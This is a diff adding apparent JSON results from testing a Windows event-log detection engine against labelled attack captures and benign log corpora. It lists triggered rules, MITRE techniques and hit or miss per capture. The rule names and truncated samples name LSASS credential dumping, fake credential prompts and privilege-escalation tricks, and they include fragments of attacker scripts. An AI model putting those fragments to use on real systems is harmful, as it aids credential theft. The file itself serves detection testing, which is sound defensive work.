+      "records": 2,
+      "events": 2,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Well-Known Low-Privilege Account Added to Local Administrators",
+          "technique": "T1098",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{\"MemberName\": \"-\", \"MemberSid\": \"S-1-5-21-3461203602-4096304019-2269080069-501\", \"TargetUserName\": \"Administrators\", \"TargetDomainName\": \"Builtin\", \"TargetSid\""
+        },
+        {
+          "rule": "Well-Known Low-Privilege Account Added to Local Administrators",
+          "technique": "T1098",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{\"MemberName\": \"-\", \"MemberSid\": \"S-1-5-20\", \"TargetUserName\": \"Administrators\", \"TargetDomainName\": \"Builtin\", \"TargetSid\": \"S-1-5-32-544\", \"SubjectUserSid\": \""
+        }
+      ],
+      "expected": [
+        "T1098"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "persistence_accessibility_features_osk_sysmon1.evtx",
+      "records": 3,
+      "events": 3,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Accessibility Feature Hijack (Shell or Tool Spawned via Accessibility Binary)",
+          "technique": "T1546.008",
+          "level": "medium",
+          "occurrences": 1,
+          "sample": "whoami"
+        }
+      ],
+      "expected": [
+        "T1546.008"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "phish_windows_credentials_powershell_scriptblockLog_4104.evtx",
+      "records": 2,
+      "events": 2,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "PowerShell Fake Credential Prompt (Phishing)",
+          "technique": "T1056.002",
+          "level": "critical",
+          "occurrences": 1,
+          "sample": "{\"MessageNumber\": \"1\", \"MessageTotal\": \"1\", \"ScriptBlockText\": \"function Invoke-LoginPrompt{\\n$cred = $Host.ui.PromptForCredential(\\\"Windows Security\\\", \\\"Pleas"
+        }
+      ],
+      "expected": [
+        "T1056.002"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "Powershell_4104_MiniDumpWriteDump_Lsass.evtx",
+      "records": 4,
+      "events": 4,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "PowerShell LSASS Memory Dump via Reflection",
+          "technique": "T1003.001",
+          "level": "critical",
+          "occurrences": 1,
+          "sample": "{\"MessageNumber\": \"1\", \"MessageTotal\": \"1\", \"ScriptBlockText\": \"function Memory($path)\\n{\\n\\t\\t\\t  \\n\\t\\t\\t  \\n\\t\\t$Process = Get-Process lsass\\n\\t\\t$DumpFilePa"
+        }
+      ],
+      "expected": [
+        "T1003.001"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "privesc_rotten_potato_from_webshell_metasploit_sysmon_1_8_3.evtx",
+      "records": 13,
+      "events": 13,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Remote Thread Creation from Scripting Engine or Web Server Process",
+          "technique": "T1055",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{\"RuleName\": null, \"UtcTime\": \"2019-05-26 15:47:57.628\", \"SourceProcessGuid\": \"{365abb72-b26b-5cea-0000-0010582a0800}\", \"SourceProcessId\": \"2744\", \"SourceImage\""
+        }
+      ],
+      "expected": [
+        "T1134",
+        "T1505.003",
+        "T1055"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "privesc_seimpersonate_tosys_spoolsv_sysmon_17_18.evtx",
+      "records": 7,
+      "events": 7,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Rogue Named Pipe with a Nested \\pipe\\ Path (PrintSpoofer / Potato)",
+          "technique": "T1134.001",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{\"RuleName\": \"Possible PrivEsc attempt - Rogue Spoolss Named Pipe\", \"EventType\": \"CreatePipe\", \"UtcTime\": \"2020-05-02 18:01:54.857\", \"ProcessGuid\": \"{747f3d96-b"
+        },
+        {
+          "rule": "Rogue Named Pipe with a Nested \\pipe\\ Path (PrintSpoofer / Potato)",
+          "technique": "T1134.001",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{\"RuleName\": \"Possible PrivEsc attempt - Rogue Spoolss Named Pipe\", \"EventType\": \"ConnectPipe\", \"UtcTime\": \"2020-05-02 18:01:54.863\", \"ProcessGuid\": \"{747f3d96-"
+        }
+      ],
+      "expected": [
+        "T1134"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "remote_sam_registry_access_via_backup_operator_priv.evtx",
+      "records": 31,
+      "events": 31,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Security Audit Log Cleared",
+          "technique": "T1685.005",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{}"
+        },
+        {
+          "rule": "Remote Registry Access over IPC$ (winreg)",
+          "technique": "T1012",
+          "level": "medium",
+          "occurrences": 2,
+          "sample": "{\"SubjectUserSid\": \"S-1-5-21-308926384-506822093-3341789130-220106\", \"SubjectUserName\": \"samir\", \"SubjectDomainName\": \"3B\", \"SubjectLogonId\": \"0x000000000056751"
+        }
+      ],
+      "expected": [
+        "T1003.002",
+        "T1012"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "rogue_msi_url_1040_1042.evtx",
+      "records": 351,
+      "events": 351,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Windows Installer Package Installed from a URL",
+          "technique": "T1218.007",
+          "level": "medium",
+          "occurrences": 2,
+          "sample": "{\"UnnamedEventData\": \"<string>http://officemysuppbox.com/staterepository</string>\\n<string>2600</string>\\n<string>(NULL)</string>\\n<string>(NULL)</string>\\n<str"
+        }
+      ],
+      "expected": [
+        "T1218.007"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "samaccount_spoofing_CVE-2021-42287_CVE-2021-42278_DC_securitylogs.evtx",
+      "records": 18,
+      "events": 18,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Security Audit Log Cleared",
+          "technique": "T1685.005",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{}"
+        },
+        {
+          "rule": "Computer Account Created by a User Account",
+          "technique": "T1136.002",
+          "level": "low",
+          "occurrences": 1,
+          "sample": "{\"TargetUserName\": \"DC012$\", \"TargetDomainName\": \"3B\", \"TargetSid\": \"S-1-5-21-308926384-506822093-3341789130-220105\", \"SubjectUserSid\": \"S-1-5-21-308926384-5068"
+        },
+        {
+          "rule": "Computer Account Renamed Without Its Trailing $ (sAMAccountName Spoofing)",
+          "technique": "T1068",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{\"OldTargetUserName\": \"DC012$\", \"NewTargetUserName\": \"01566s-win16-ir\", \"TargetDomainName\": \"3B\", \"TargetSid\": \"S-1-5-21-308926384-506822093-3341789130-220105\","
+        }
+      ],
+      "expected": [
+        "T1068",
+        "T1136.002",
+        "T1098",
+        "T1558"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "sysmon_10_lsass_mimikatz_sekurlsa_logonpasswords.evtx",
+      "records": 1,
+      "events": 1,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Suspicious LSASS Process Memory Access",
+          "technique": "T1003.001",
+          "level": "critical",
+          "occurrences": 1,
+          "sample": "{\"RuleName\": null, \"UtcTime\": \"2019-03-17 19:37:11.641\", \"SourceProcessGUID\": \"{365abb72-a1e3-5c8e-0000-0010cef72200}\", \"SourceProcessId\": \"3588\", \"SourceThread"
+        }
+      ],
+      "expected": [
+        "T1003.001"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "Sysmon_13_1_UACBypass_SDCLTBypass.evtx",
+      "records": 5,
+      "events": 5,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "UAC Bypass via sdclt.exe IsolatedCommand Registry Hijack",
+          "technique": "T1548.002",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{\"RuleName\": null, \"EventType\": \"SetValue\", \"UtcTime\": \"2019-05-09 02:07:51.100\", \"ProcessGuid\": \"{365abb72-88dc-5cd3-0000-00100da51a00}\", \"ProcessId\": \"2704\", "
+        }
+      ],
+      "expected": [
+        "T1548.002"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "sysmon_20_21_1_CommandLineEventConsumer.evtx",
+      "records": 17,
+      "events": 17,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "WMI CommandLineEventConsumer Persistence",
+          "technique": "T1546.003",
+          "level": "high",
+          "occurrences": 2,
+          "sample": "{\"RuleName\": null, \"EventType\": \"WmiConsumerEvent\", \"UtcTime\": \"2019-05-11 17:58:23.340\", \"Operation\": \"Created\", \"User\": \"IEWIN7\\\\IEUser\", \"Name\": \"\\\"BotConsum"
+        },
+        {
+          "rule": "Suspicious LSASS Process Memory Access",
+          "technique": "T1003.001",
+          "level": "critical",
+          "occurrences": 1,
+          "sample": "{\"RuleName\": null, \"UtcTime\": \"2019-05-11 17:58:54.762\", \"SourceProcessGUID\": \"{365abb72-0d3e-5cd7-0000-0010680e1600}\", \"SourceProcessId\": \"1832\", \"SourceThread"
+        }
+      ],
+      "expected": [
+        "T1546.003"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "sysmon_2_11_evasion_timestomp_MACE.evtx",
+      "records": 2,
+      "events": 2,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "File Creation Timestamp Backdated (Timestomping)",
+          "technique": "T1070.006",
+          "level": "medium",
+          "occurrences": 1,
+          "sample": "{\"RuleName\": null, \"UtcTime\": \"2019-04-30 10:13:42.052\", \"ProcessGuid\": \"{365abb72-16cd-5cc8-0000-0010483a0600}\", \"ProcessId\": \"2836\", \"Image\": \"C:\\\\Windows\\\\Ex"
+        }
+      ],
+      "expected": [
+        "T1070.006"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "sysmon_mshta_sharpshooter_stageless_meterpreter.evtx",
+      "records": 3,
+      "events": 3,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Suspicious Mshta Execution",
+          "technique": "T1218.005",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "\"C:\\Windows\\System32\\mshta.exe\" \"C:\\Users\\IEUser\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\S97WTYG7\\update.hta\""
+        },
+        {
+          "rule": "Network Connection from a Proxy-Execution LOLBin",
+          "technique": "T1071.001",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "C:\\Windows\\System32\\mshta.exe"
+        }
+      ],
+      "expected": [
+        "T1218.005"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "temp_scheduled_task_4698_4699.evtx",
+      "records": 2,
+      "events": 2,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Scheduled Task Created with Hidden Flag",
+          "technique": "T1053.005",
+          "level": "medium",
+          "occurrences": 1,
+          "sample": "{\"SubjectUserSid\": \"S-1-5-21-1587066498-1489273250-1035260531-500\", \"SubjectUserName\": \"Administrator\", \"SubjectDomainName\": \"EXAMPLE\", \"SubjectLogonId\": \"0x000"
+        }
+      ],
+      "expected": [
+        "T1053.005"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx",
+      "records": 55,
+      "events": 55,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Security Audit Log Cleared",
+          "technique": "T1685.005",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{}"
+        }
+      ],
+      "expected": [
+        "T1098",
+        "T1222.001",
+        "T1558.003"
+      ],
+      "any_alert": true,
+      "correct": false
+    },
+    {
+      "name": "CA_4624_4625_LogonType2_LogonProc_chrome.evtx",
+      "records": 4,
+      "events": 4,
+      "skipped": 0,
+      "alerts": [],
+      "expected": [
+        "T1110",
+        "T1078",
+        "T1555.003"
+      ],
+      "any_alert": false,
+      "correct": false
+    },
+    {
+      "name": "CA_PetiPotam_etw_rpc_efsr_5_6.evtx",
+      "records": 29109,
+      "events": 29109,
+      "skipped": 0,
+      "alerts": [],
+      "expected": [
+        "T1187"
+      ],
+      "any_alert": false,
+      "correct": false
+    },
+    {
+      "name": "Discovery_Remote_System_NamedPipes_Sysmon_18.evtx",
+      "records": 20,
+      "events": 20,
+      "skipped": 0,
+      "alerts": [],
+      "expected": [
+        "T1018",
+        "T1135"
+      ],
+      "any_alert": false,
+      "correct": false
+    },
+    {
+      "name": "discovery_sysmon_18_Invoke_UserHunter_NetSessionEnum_DC-srvsvc.evtx",
+      "records": 1,
+      "events": 1,
+      "skipped": 0,
+      "alerts": [],
+      "expected": [
+        "T1033",
+        "T1049"
+      ],
+      "any_alert": false,
+      "correct": false
+    },
+    {
+      "name": "discovery_sysmon_3_Invoke_UserHunter_SourceMachine.evtx",
+      "records": 9,
+      "events": 9,
+      "skipped": 0,
+      "alerts": [],
+      "expected": [
+        "T1033",
+        "T1087",
+        "T1069",
+        "T1018"
+      ],
+      "any_alert": false,
+      "correct": false
+    },
+    {
+      "name": "NTLM2SelfRelay-med0x2e-security_4624_4688.evtx",
+      "records": 11,
+      "events": 11,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Security Audit Log Cleared",
+          "technique": "T1685.005",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{}"
+        }
+      ],
+      "expected": [
+        "T1557",
+        "T1187"
+      ],
+      "any_alert": true,
+      "correct": false
+    },
+    {
+      "name": "Sysmon_UACME_32.evtx",
+      "records": 8,
+      "events": 8,
+      "skipped": 0,
+      "alerts": [],
+      "expected": [
+        "T1548.002"
+      ],
+      "any_alert": false,
+      "correct": false
+    }
+  ],
+  "benign": [
+    {
+      "name": "bits_openvpn.evtx",
+      "records": 1537,
+      "events": 1537,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "mislabeled attack capture"
+    },
+    {
+      "name": "application_4100.evtx",
+      "records": 4153,
+      "events": 4153,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "application_session_early.evtx",
+      "records": 5000,
+      "events": 5000,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "application_session_late.evtx",
+      "records": 5000,
+      "events": 5000,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "application_session_mid1.evtx",
+      "records": 5000,
+      "events": 5000,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "application_session_mid2.evtx",
+      "records": 5002,
+      "events": 5002,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "powershell_820.evtx",
+      "records": 820,
+      "events": 820,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "security_32761.evtx",
+      "records": 32761,
+      "events": 32761,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "security_window_01.evtx",
+      "records": 5000,
+      "events": 5000,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "security_window_02.evtx",
+      "records": 5018,
+      "events": 5018,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "security_window_03.evtx",
+      "records": 5001,
+      "events": 5001,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "security_window_04.evtx",
+      "records": 5001,
+      "events": 5001,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "security_window_05.evtx",
+      "records": 5004,
+      "events": 5004,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "security_window_06.evtx",
+      "records": 5000,
+      "events": 5000,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "security_window_07.evtx",
+      "records": 5000,
+      "events": 5000,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "security_window_08.evtx",
+      "records": 5000,
+      "events": 5000,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "security_window_09.evtx",
+      "records": 5000,
+      "events": 5000,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "security_window_10.evtx",
+      "records": 5003,
+      "events": 5003,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "sysmon_48113.evtx",
+      "records": 48125,
+      "events": 48125,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "sysmon_window_01.evtx",
+      "records": 3058,
+      "events": 3058,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "sysmon_window_02.evtx",
+      "records": 3048,
+      "events": 3048,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "sysmon_window_03.evtx",
+      "records": 3048,
+      "events": 3048,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "sysmon_window_04.evtx",
+      "records": 3096,
+      "events": 3096,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "sysmon_window_05.evtx",
+      "records": 3316,
+      "events": 3316,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "sysmon_window_06.evtx",
+      "records": 5069,
+      "events": 5069,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "sysmon_window_07.evtx",
+      "records": 3325,
+      "events": 3325,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "sysmon_window_08.evtx",
+      "records": 5076,
+      "events": 5076,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "sysmon_window_09.evtx",
+      "records": 3105,
+      "events": 3105,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "sysmon_window_10.evtx",
+      "records": 3591,
+      "events": 3591,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "system_5000.evtx",
+      "records": 5088,
+      "events": 5088,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Windows Event Log Cleared (System 104)",
+          "technique": "T1685.005",
+          "level": "high",
+          "occurrences": 2,
+          "sample": "{}"
+        },
+        {
+          "rule": "Windows Event Log Cleared (System 104)",
+          "technique": "T1685.005",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{}"
+        },
+        {
+          "rule": "Windows Event Log Cleared (System 104)",
+          "technique": "T1685.005",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{}"
+        },
+        {
+          "rule": "Windows Event Log Cleared (System 104)",
+          "technique": "T1685.005",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{}"
+        },
+        {
+          "rule": "Windows Event Log Cleared (System 104)",
+          "technique": "T1685.005",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{}"
+        }
+      ],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "system_baseline.evtx",
+      "records": 5000,
+      "events": 4966,
+      "skipped": 34,
+      "alerts": [],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "system_final_session.evtx",
+      "records": 5000,
+      "events": 4966,
+      "skipped": 34,
+      "alerts": [],
+      "corpus": "NightOwl-Benign-Dataset"
+    },
+    {
+      "name": "nightowl_benign_powershell.evtx",
+      "records": 1235,
+      "events": 1235,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "benign (local only)"
+    },
+    {
+      "name": "nightowl_benign_security.evtx",
+      "records": 31818,
+      "events": 31818,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "benign (local only)"
+    },
+    {
+      "name": "sysmon_vm_capture.evtx",
+      "records": 64558,
+      "events": 64558,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "benign (local only)"
+    },
+    {
+      "name": "noise_afternoon_stretch.evtx",
+      "records": 4055,
+      "events": 4055,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "synthetic noise"
+    },
+    {
+      "name": "noise_brief_window.evtx",
+      "records": 1258,
+      "events": 1258,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "synthetic noise"
+    },
+    {
+      "name": "noise_late_session.evtx",
+      "records": 3039,
+      "events": 3039,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "synthetic noise"
+    },
+    {
+      "name": "noise_mid_morning.evtx",
+      "records": 2079,
+      "events": 2079,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "synthetic noise"
+    },
+    {
+      "name": "noise_short_burst.evtx",
+      "records": 655,
+      "events": 655,
+      "skipped": 0,
+      "alerts": [],
+      "corpus": "synthetic noise"
+    }
+  ]
+}
